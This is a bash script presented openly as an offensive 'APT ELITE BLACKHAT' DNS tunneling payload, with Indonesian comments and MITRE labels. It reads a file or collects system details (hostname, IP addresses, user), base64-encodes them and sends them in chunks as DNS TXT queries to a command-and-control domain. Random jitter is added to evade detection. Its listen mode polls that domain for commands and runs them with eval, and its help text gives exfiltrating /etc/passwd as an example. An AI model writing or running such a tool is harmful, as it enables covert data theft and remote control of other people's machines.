#!/usr/bin/env bash
#
# dns_tunnel.sh - DNS Tunneling Payload for APT ELITE BLACKHAT
# Version: 1.0.0
# Description: Exfiltrates data or receives commands via DNS queries to bypass firewalls.
# Usage: ./dns_tunnel.sh [payload_file] [target_domain] [interval_seconds]
#
# MITRE Tactic: T1071.001 (DNS)
# Technique: T1048 (Exfiltration Over Alternative Protocol)

set -euo pipefail

# --- CONFIGURATION ---
DEFAULT_DOMAIN="elite-blackhat-c2.com" # Ganti dengan domain C2 Anda
DEFAULT_INTERVAL=5                    # Detik antara query
DEFAULT_PAYLOAD=""                    # File payload lokal untuk dieksfiltrasi
LOG_FILE="/tmp/.dns_tunnel.log"       # Log internal rootkit

# --- COLORS FOR OUTPUT ---
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m' # No Color

# --- FUNCTIONS ---

log_msg() {
    local level="$1"
    local msg="$2"
    echo "[$(date '+%Y-%m-%d %H:%M:%S')] [${level}] ${msg}" >> "$LOG_FILE"
    if [[ "$level" == "ERROR" ]]; then
        echo -e "${RED}[ERROR]${NC} $msg" >&2
    elif [[ "$level" == "INFO" ]]; then
        echo -e "${GREEN}[INFO]${NC} $msg"
    fi
}

check_dependencies() {
    local deps=("bash" "awk" "sed" "base64")
    local missing=()
    
    for cmd in "${deps[@]}"; do
        if ! command -v "$cmd" &> /dev/null; then
            missing+=("$cmd")
        fi
    done
    
    # Check for DNS lookup tool
    if ! command -v dig &> /dev/null && ! command -v nslookup &> /dev/null && ! command -v host &> /dev/null; then
        log_msg "ERROR" "No DNS lookup utility found (dig, nslookup, or host required)."
        exit 1
    fi
    
    if [[ ${#missing[@]} -gt 0 ]]; then
        log_msg "WARN" "Missing optional dependencies: ${missing[*]}"
    fi
}

get_dns_tool() {
    if command -v dig &> /dev/null; then
        echo "dig"
    elif command -v nslookup &> /dev/null; then
        echo "nslookup"
    else
        echo "host"
    fi
}

# Encode data into DNS-safe labels (max 63 chars per label)
encode_payload() {
    local input="$1"
    # Base64 encode, then split into chunks of 63 characters
    echo -n "$input" | base64 -w 0 | fold -w 63
}

# Decode data from DNS response (if using DNS as a command channel)
decode_response() {
    local input="$1"
    echo -n "$input" | base64 -d 2>/dev/null || echo "[Decoding Failed]"
}

# Send DNS Query
send_query() {
    local domain="$1"
    local subdomain_data="$2"
    local dns_tool=$(get_dns_tool)
    
    case "$dns_tool" in
        dig)
            # Use TXT record query for larger data capacity
            dig +short +tries=1 +time=2 txt "${subdomain_data}.${domain}" @8.8.8.8 2>/dev/null || true
            ;;
        nslookup)
            nslookup -type=TXT "${subdomain_data}.${domain}" 8.8.8.8 2>/dev/null | grep -o '"[^"]*"' | tr -d '"' || true
            ;;
        host)
            host -t TXT "${subdomain_data}.${domain}" 8.8.8.8 2>/dev/null | sed 's/.*"\(.*\)".*/\1/' || true
            ;;
    esac
}

exfiltrate_file() {
    local file_path="$1"
    local target_domain="$2"
    
    if [[ ! -f "$file_path" ]]; then
        log_msg "ERROR" "File not found: $file_path"
        return 1
    fi
    
    log_msg "INFO" "Starting exfiltration of $(basename "$file_path")..."
    
    local file_size=$(stat -c%s "$file_path" 2>/dev/null || stat -f%z "$file_path" 2>/dev/null)
    log_msg "INFO" "File size: $file_size bytes"
    
    # Read file and encode in chunks
    local chunk_size=50 # Characters per DNS label
    local total_chars=$(wc -c < "$file_path")
    local offset=0
    local chunk_num=0
    
    while [[ $offset -lt $total_chars ]]; do
        local chunk=$(dd if="$file_path" bs=1 skip=$offset count=$chunk_size 2>/dev/null | base64 -w 0)
        
        # Append sequence number to detect packet loss/reordering
        local labeled_query="${chunk_num}.${chunk}"
        
        send_query "$target_domain" "$labeled_query"
        
        offset=$((offset + chunk_size))
        chunk_num=$((chunk_num + 1))
        
        # Small jitter to avoid perfect timing patterns
        sleep $((RANDOM % 3 + 1))
    done
    
    log_msg "INFO" "Exfiltration complete."
}

listen_for_commands() {
    local target_domain="$1"
    local interval="$2"
    
    log_msg "INFO" "Listening for commands on DNS channel..."
    
    while true; do
        # Query a specific subdomain for commands, e.g., cmd.elite-blackhat-c2.com
        local response=$(send_query "$target_domain" "cmd")
        
        if [[ -n "$response" && "$response" != *"NOTFOUND"* ]]; then
            local decoded_cmd=$(echo "$response" | decode_response)
            if [[ -n "$decoded_cmd" ]]; then
                log_msg "INFO" "Received command: $decoded_cmd"
                eval "$decoded_cmd" 2>/dev/null
            fi
        fi
        
        sleep "$interval"
    done
}

show_help() {
    echo "Usage: $0 [OPTIONS]"
    echo ""
    echo "Options:"
    echo "  -f <file>      File to exfiltrate (default: stdin)"
    echo "  -d <domain>    Target C2 Domain (default: $DEFAULT_DOMAIN)"
    echo "  -i <seconds>   Interval between queries (default: $DEFAULT_INTERVAL)"
    echo "  -l             Listen mode (receive commands via DNS)"
    echo "  -h             Show this help message"
    echo ""
    echo "Examples:"
    echo "  # Exfiltrate /etc/passwd"
    echo "  $0 -f /etc/passwd -d elite-blackhat-c2.com"
    echo ""
    echo "  # Listen for commands"
    echo "  $0 -l -d elite-blackhat-c2.com -i 10"
}

# --- MAIN EXECUTION ---

main() {
    check_dependencies
    
    local mode="exfil"
    local payload_file=""
    local domain="$DEFAULT_DOMAIN"
    local interval="$DEFAULT_INTERVAL"
    
    while getopts "f:d:i:lh" opt; do
        case $opt in
            f) payload_file="$OPTARG" ;;
            d) domain="$OPTARG" ;;
            i) interval="$OPTARG" ;;
            l) mode="listen" ;;
            h) show_help; exit 0 ;;
            *) show_help; exit 1 ;;
        esac
    done
    
    log_msg "INFO" "DNS Tunnel initialized. Mode: $mode | Domain: $domain | Interval: ${interval}s"
    
    if [[ "$mode" == "listen" ]]; then
        listen_for_commands "$domain" "$interval"
    else
        if [[ -n "$payload_file" ]]; then
            exfiltrate_file "$payload_file" "$domain"
        else
            # Default: Exfiltrate hostname and IP info
            log_msg "INFO" "Default payload: System Info"
            local sys_info=$(hostname; ip addr show 2>/dev/null | grep "inet " | awk '{print $2}'; whoami; date)
            exfiltrate_file <(echo "$sys_info") "$domain"
        fi
    fi
}

# Run main function
main "$@"
